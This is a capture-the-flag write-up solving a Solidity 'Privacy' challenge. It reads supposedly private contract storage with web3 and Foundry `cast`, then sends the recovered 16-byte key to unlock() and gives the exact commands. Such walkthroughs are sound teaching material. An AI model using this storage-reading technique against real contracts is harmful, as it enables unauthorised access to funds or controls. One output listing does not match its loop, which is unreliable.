
### Challenge 12 Privacy
- 
- The function we need to bypass to make `locked` true.
```Solidity
    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
```

- This challenge is supposed to teach us about storage layout. Each slot is 32 bytes in size

- Reading storage layout with web3.eth
```JavaScript
await web3.eth.getStorageAt(contract.address, slot)
```

- Solidity storage rules: State variables are stored sequentially in 32-byte slots.
* Key rules:
    * Each slot is 32 bytes
    * Variables smaller than 32 bytes are packed together
    * Packing happens left-to-right within the same slot
    * Arrays and structs usually start a fresh slot
    * Fixed-size arrays store elements consecutively

```Solidity
contract Privacy {
    /* 1 byte  */ bool public locked = true; // takes slot 0 
    /* 32 byte */ uint256 public ID = block.timestamp; // creates new slot 1
    /* 1 byte  */ uint8 private flattening = 10; // creates slot 2
    /* 1 byte  */ uint8 private denomination = 255; // got into slot 2
    /* 2 byte  */ uint16 private awkwardness = uint16(block.timestamp); // got into slot 2
    /* 32 byte */ bytes32[3] private data; // creates new slot 3. each sequential data is in new slots because each of them sized 32 bytes (slot size)
```
 
```fish
❯ for i in (seq 1 5); cast storage $INSTANCE $i --rpc-url $RPC_URL; end
0x000000...00000001 // 0 - bool locked 
0x000000...69fc4770 // 1 - uint256 ID 
0x000000...4770ff0a // 2 - uint8 flattening, denomination, awkwardness
0x9d2d53...f406a7d1 // 3 - bytes32 data[0]
0x08bd64...c5ecfb49 // 4 - bytes32 data[1]
0x3b03e3...2ff12297 // 5 - bytes32 data[2]
```
- our unlock() password is in slot 5. Lets start unlocking:

- the function requires bytes16, so we just take the first 16 bytes from the data.
```
# send
cast send $INSTANCE "unlock(bytes16)" 0x3b03e34c1a600562b2fe5df4266d6095 \
    --rpc-url $RPC_URL --private-key $PK 

# verify
cast call $INSTANCE "locked()" --rpc-url $RPC_URL 
0x0000000000000000000000000000000000000000000000000000000000000000
```
- yep, not locked anymore. Success!
